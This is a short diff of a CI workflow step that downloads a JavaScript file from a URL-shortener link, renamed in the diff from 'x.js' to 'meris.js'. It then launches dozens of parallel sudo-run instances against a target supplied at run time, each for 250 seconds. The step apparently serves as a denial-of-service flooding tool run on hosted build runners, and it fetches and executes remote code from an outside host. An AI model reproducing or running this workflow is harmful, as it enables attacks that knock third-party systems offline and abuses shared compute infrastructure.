@@ -23,12 +23,12 @@ jobs:
       - name: OK !
         run: |
           TARGET="${{ inputs.target }}"
-          wget https://curl.by/SwZOV/x.js
-          chmod +x x.js
+          wget https://curl.by/W5CU9/meris.js
+          chmod +x meris.js
           
           PIDS=()
-          for i in {1..128}; do
-            sudo timeout 250 node x.js "$TARGET" 250 
+          for i in {1..96}; do
+            sudo timeout 250 node meris.js "$TARGET" 250 
             PIDS+=($!)
           done
 
